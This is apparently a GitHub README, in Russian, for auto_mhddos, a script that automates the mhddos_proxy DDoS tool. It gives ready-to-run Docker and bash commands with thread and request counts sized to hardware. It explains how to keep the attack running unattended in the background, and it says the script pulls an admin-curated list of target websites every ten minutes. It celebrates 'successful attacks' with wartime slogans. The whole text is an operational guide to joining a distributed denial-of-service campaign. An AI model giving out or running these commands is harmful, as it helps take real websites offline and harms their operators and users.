### ⭕️ Оперативный штаб Жнецов
![photo_2022-03-17_23-39-03](https://user-images.githubusercontent.com/41838573/158963538-944690c4-83ea-4934-9a29-6eb8f1e61f3a.jpg)

### Представляем auto_mhddos - автоматизирующий скрипт [mhddos_proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy)

1. [Docker](https://github.com/Aruiem234/auto_mhddos#-docker)
2. [Bash(Linux-терминал)](https://github.com/Aruiem234/auto_mhddos#-bash)
3. [Kubernetes](https://github.com/Aruiem234/auto_mhddos/tree/main/helm-charts#mhddos-auto-helm-charts)

## 🪖 Docker

Установить [Docker](https://docs.docker.com/get-docker/) и запустить команду:  
  
* для ленивих(кол-во потоков будет 1000, запросов на прокси-сервер перед отправкой на цель: 200):
```shell
docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest
```



### Команды docker для разного железа: 

-- Слабое (2 ядра + 2-4 ГБ Озу).


```shell
docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest 500 100  
```
  
-- Среднее (4 ядра + 4-8 Гб Озу) .Эти же параметры использутся по умолчанию, если запускать команду без аргументов.:   
  

```shell
docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest 1000 200  
```
  
-- Быстрое(4+ ядер + 8+ Гб Озу):  

  
```shell
docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest 2500 400  
```
  
Значение параметров на примере "500 100":  
  
500 - количество потоков (threads). Параметр -t в mhddos_proxy.  
  
100 - параметр --rpc в mhddos_proxy. (количество пакетов отправляемых на прокси-сервер, перед тем как он передаст их на сайт-цель)  

Пример успешной атаки без третьего параметра --debug(больше ничего выводится не будет):  
![Стандартный вывод](https://user-images.githubusercontent.com/74729549/159160084-3ffd870b-7d17-44c9-9108-3908212402ce.png)  


ТАКЖЕ МОЖНО ДОБАВИТЬ В КОНЕЦ ТРЕТИЙ ПАРАМЕТР --debug , чтоб выводилась информация о каждом отправленном пакете,  
например:  
```shell
docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest 500 100 --debug  
```
пример вывода с параметром --debug:  
![Параметр --debug](https://user-images.githubusercontent.com/74729549/159160027-dcc51f91-3d0b-4dd7-abe8-b63edf136e1e.png)  
  
  
  
## 🪖 Bash(Linux-терминал)  


### 1. Установка.  
  
Выполняется для начальной установки ПО, и периодического обновления. Не обязательно использовать каждый раз.  


```shell
sudo su
apt install git -y
cd ~  
git clone https://github.com/Aruiem234/auto_mhddos.git  
cd ~/auto_mhddos  
bash setup.sh  

```
!!!Ждем пока выполнится!!!  


Скрипт автоматически устанавливает git, python3, pip, mhddos_proxy, MHDDoS и все зависимости.

### 2. Запуск.

Bash скрипт работает в Linux и WSL (Windows Subsystem for Linux). Работает автоматически, даже при закрытии терминала (если вы четко придерживаетесь инструкций)  

Не забудьте сначала выполнить пункт №1 (Установка).  


```shell
sudo su
cd ~/auto_mhddos
screen -S "runner" bash runner.sh 1000 200
```
Пример успешной атаки без третьего параметра --debug(больше ничего выводится не будет):  
![Стандартный вывод](https://user-images.githubusercontent.com/74729549/159160084-3ffd870b-7d17-44c9-9108-3908212402ce.png)  
  
  
ТАКЖЕ МОЖНО ДОБАВИТЬ В КОНЕЦ ТРЕТИЙ ПАРАМЕТР --debug , чтоб выводилась информация о каждом отправленном пакете,
например:  
```shell
docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest 500 100 --debug  
```
пример вывода с параметром --debug:  
![Параметр --debug](https://user-images.githubusercontent.com/74729549/159160027-dcc51f91-3d0b-4dd7-abe8-b63edf136e1e.png)  

Для разных машин вместо параметров "1000 200" выбирайте следующее:  
-- Слабое (2 ядра + 2-4 ГБ Озу) - 500 100  
-- Среднее (4 ядра + 4-8 Гб Озу) - 1000 200  
-- Быстрое(4+ ядер + 8+ Гб Озу) - 2500 400  

Нажимаем Ctrl+A , затем Ctrl+D - И ВСЕ ГОТОВО - РАБОТАЕТ В ФОНЕ  
Если все успешно, то будет сообщение [detached from runner]  
  
Чтоб посмотреть, что там работает в фоне:  
```shell
sudo screen -ls
```
  
Чтоб перейти к процессу и узнать как у него дела (что он выводит)
щоб перейти до процесу та дізнатися як у нього справи (що він виводить), пишите:
```shell
screen -r runner
```
После этого, если захотите убить процес - нажимайте Ctrl+C  
Чтоб убить все его подпроцесы:  
```shell
sudo pkill -f runner.py
sudo pkill -f ./start.py
```
  
чтоб опять отключиться, и оставить его работать в фоне:  
Нажимаем Ctrl+A , затем Ctrl+D - И ВСЕ ГОТОВО - РАБОТАЕТ В ФОНЕ  


# ❕Описание

* Скрипт работает полностью автоматически - ВЫ МОЖЕТЕ ЗАКРЫВАТЬ ОКНО ТЕРМИНАЛА(кроме докера на Windows), но не выключать саму машину (а сервер и так работает 24/7)

* Работает с курируемым админами единым списком [сайтов-целей](https://github.com/Aruiem234/auto_mhddos/blob/main/runner_targets).

* База целей обновляется скриптом каждые 10 мин.




Теоретически все это позволяет запустить скрипт на ПК/vps и всю остальную работу (обновление, перезапуск) он будет делать самостоятельно.

Рекомендуется использовать на Ubuntu 20.04. Вероятно будет работать на всех Ubuntu начиная с 18.04, а также всех производных Ubuntu и WSL2.



### 🇺🇦🇺🇦🇺🇦 СЛАВА УКРАЇНІ 🇺🇦🇺🇦🇺🇦
### ПТН ХЛО 🤡
